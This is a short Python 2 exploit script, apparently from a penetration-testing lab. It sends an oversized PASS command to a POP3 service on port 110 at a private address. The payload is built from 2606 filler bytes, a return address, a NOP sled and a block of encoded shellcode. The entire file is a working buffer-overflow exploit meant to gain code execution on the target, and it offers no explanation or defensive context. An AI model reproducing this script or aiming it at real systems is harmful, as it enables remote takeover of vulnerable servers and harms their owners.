#!usr/bin/python

import socket
counter=100
shellcode = ("\xd9\xce\xd9\x74\x24\xf4\xbd\x7b\x1d\x9b\x1f\x58\x29\xc9\xb1"
"\x52\x31\x68\x17\x83\xe8\xfc\x03\x13\x0e\x79\xea\x1f\xd8\xff"
"\x15\xdf\x19\x60\x9f\x3a\x28\xa0\xfb\x4f\x1b\x10\x8f\x1d\x90"
"\xdb\xdd\xb5\x23\xa9\xc9\xba\x84\x04\x2c\xf5\x15\x34\x0c\x94"
"\x95\x47\x41\x76\xa7\x87\x94\x77\xe0\xfa\x55\x25\xb9\x71\xcb"
"\xd9\xce\xcc\xd0\x52\x9c\xc1\x50\x87\x55\xe3\x71\x16\xed\xba"
"\x51\x99\x22\xb7\xdb\x81\x27\xf2\x92\x3a\x93\x88\x24\xea\xed"
"\x71\x8a\xd3\xc1\x83\xd2\x14\xe5\x7b\xa1\x6c\x15\x01\xb2\xab"
"\x67\xdd\x37\x2f\xcf\x96\xe0\x8b\xf1\x7b\x76\x58\xfd\x30\xfc"
"\x06\xe2\xc7\xd1\x3d\x1e\x43\xd4\x91\x96\x17\xf3\x35\xf2\xcc"
"\x9a\x6c\x5e\xa2\xa3\x6e\x01\x1b\x06\xe5\xac\x48\x3b\xa4\xb8"
"\xbd\x76\x56\x39\xaa\x01\x25\x0b\x75\xba\xa1\x27\xfe\x64\x36"
"\x47\xd5\xd1\xa8\xb6\xd6\x21\xe1\x7c\x82\x71\x99\x55\xab\x19"
"\x59\x59\x7e\x8d\x09\xf5\xd1\x6e\xf9\xb5\x81\x06\x13\x3a\xfd"
"\x37\x1c\x90\x96\xd2\xe7\x73\x93\x29\xe7\xed\xcb\x2f\xe7\xf0"
"\xb0\xb9\x01\x98\xd6\xef\x9a\x35\x4e\xaa\x50\xa7\x8f\x60\x1d"
"\xe7\x04\x87\xe2\xa6\xec\xe2\xf0\x5f\x1d\xb9\xaa\xf6\x22\x17"
"\xc2\x95\xb1\xfc\x12\xd3\xa9\xaa\x45\xb4\x1c\xa3\x03\x28\x06"
"\x1d\x31\xb1\xde\x66\xf1\x6e\x23\x68\xf8\xe3\x1f\x4e\xea\x3d"
"\x9f\xca\x5e\x92\xf6\x84\x08\x54\xa1\x66\xe2\x0e\x1e\x21\x62"
"\xd6\x6c\xf2\xf4\xd7\xb8\x84\x18\x69\x15\xd1\x27\x46\xf1\xd5"
"\x50\xba\x61\x19\x8b\x7e\x91\x50\x91\xd7\x3a\x3d\x40\x6a\x27"
"\xbe\xbf\xa9\x5e\x3d\x35\x52\xa5\x5d\x3c\x57\xe1\xd9\xad\x25"
"\x7a\x8c\xd1\x9a\x7b\x85")

buffer="A" *2606 + "\x8f\x35\x4a\x5f" + "\x90" *16 + shellcode +"C" * (3500-2606-4-351-16)
#	buffer.append("A"*counter)
#	counter=counter+200

#for string in buffer:
print "Fuzzing pass with %s bytes" %len(buffer)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('10.11.25.81', 110))
s.recv(1024)

s.send('USER test \r\n')
s.recv(1024)
s.send('PASS ' +buffer+ '\r\n')
s.send('QUIT \r\n')
s.close()

